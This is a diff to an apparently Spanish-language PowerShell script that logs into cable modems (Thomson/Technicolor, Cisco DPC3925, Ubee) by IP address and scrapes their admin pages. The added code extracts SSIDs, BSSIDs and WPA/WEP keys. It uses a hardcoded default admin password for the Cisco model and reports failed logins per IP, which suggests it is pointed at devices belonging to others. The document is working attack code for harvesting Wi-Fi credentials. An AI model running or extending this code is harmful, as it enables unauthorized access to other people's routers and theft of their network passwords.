@@ -104,8 +104,12 @@ function techTom($ip){
 			$PASS = (($thompson -match ('name="WpaPreSharedKey" size="*32"* maxlength="*64"* value=".*"')) -split 'value="')[1].split('"')[0]
 			
 			#Si la contraseña está vacia es porque es WEP
-			if([string]::IsNullOrEmpty($$PASS.Trim())){
+			if([string]::IsNullOrEmpty($PASS.Trim())){
 				$PASS = (($thompson -match 'name="*NetworkKey1"* size="*26"* maxlength="*26"* value=') -split 'value=')[1].split('>')[0]
+			}
+
+			if(($BSSID -like '*PRIMARY*')){
+				($thompson -match '([0-9A-Fa-f]{2}[:]){5}[0-9A-Fa-f]{2}').split('()')
 			}
 
 			"$BSSID - $PASS"
@@ -121,10 +125,25 @@ function techTom($ip){
 function cisco($ip){
 	Write-Output "=========$ip - Cisco DPC3925=========" 
 	$cookie = "$SAVE_FOLDER\$ip"+"cookie.txt"
+	$ciscoPassword = "$SAVE_FOLDER\$ip"+"password.txt"
     wget -qO- -q --keep-session-cookies --save-cookies $cookie --post-data "username_login=admin&password_login=Uq-4GIt3M&LanguageSelect=en&Language_Submit=0&login=Log+In" -T 3 http://$ip/goform/Docsis_system | out-null;
 	if(Test-Path $cookie){
 		wget -qO- -q --load-cookies $cookie -O $save --header="User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" --header="Referer: http://$ip/Status.asp" --header="Connection: keep-alive" -T 3 http://$ip/WNetwork.asp | out-null;
 		verifyFile
+
+		if([System.IO.File]::Exists($save)){
+			$cisco = Get-Content $save
+			$SSID = ($cisco -match ('([0-9A-Fa-f]{2}[:]){5}[0-9A-Fa-f]{2}')).Split('(')[0].Trim()
+			$BSSID = ($cisco -match ('([0-9A-Fa-f]{2}[:]){5}[0-9A-Fa-f]{2}')).Split('(')[1].Split(')')[0]
+
+			wget -qO- -q --load-cookies $cookie  -O $ciscoPassword --header="User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" --header="Referer: http://$ip/Status.asp" --header="Connection: keep-alive" -T 3 http://$ip/WSecurity.asp | out-null;
+			
+			if([System.IO.File]::Exists($ciscoPassword)){
+				$ciscoPass = Get-Content $ciscoPassword
+				$PASS = (($ciscoPass -match 'name="*wifi0_wpaPsk_key"* size="*32"* maxlength="*64"* value="*' ) -split 'value=')[1].split('"')[1]
+				"$SSID - $BSSID - $PASS"
+			}
+		}
 		Remove-Item $cookie;
 	}else{
 		Write-Output "No se pudo obtener acceso a $ip. Verificar credenciales"
@@ -260,6 +279,18 @@ function ubee($ip){
     curl --connect-timeout 3 -m 10 -s -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "Referer: http://$ip/wlanRadio.asp" -H "Connection: keep-alive" --compressed http://$ip/wlanPrimaryNetwork.asp | out-null;
     curl -o $save --connect-timeout 3 -m 60 -s -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "Referer: http://$ip/wlanRadio.asp" -H "Connection: keep-alive" --compressed http://$ip/wlanPrimaryNetwork.asp;
     verifyFile
+
+	if([System.IO.File]::Exists($save)){
+		$ubee = Get-Content $save
+		$SSID = ($ubee -match '([0-9A-Fa-f]{2}[:]){5}([0-9A-Fa-f]{2})').replace('<tr><td align=middle valign=top>','').split('(')[0].Trim()
+		$BSSID = ($ubee -match '([0-9A-Fa-f]{2}[:]){5}([0-9A-Fa-f]{2})').split('()')[1].Trim()
+		$PASS = (($ubee -match ('name="WpaPreSharedKey" size="*32"* maxlength="*64"* value=".*"')) -split 'value="')[1].split('"')[0]
+		"$BSSID - $SSID - $PASS"
+	}
+		
+
+
+
 }
 
 #Ubee sin DOCSIS
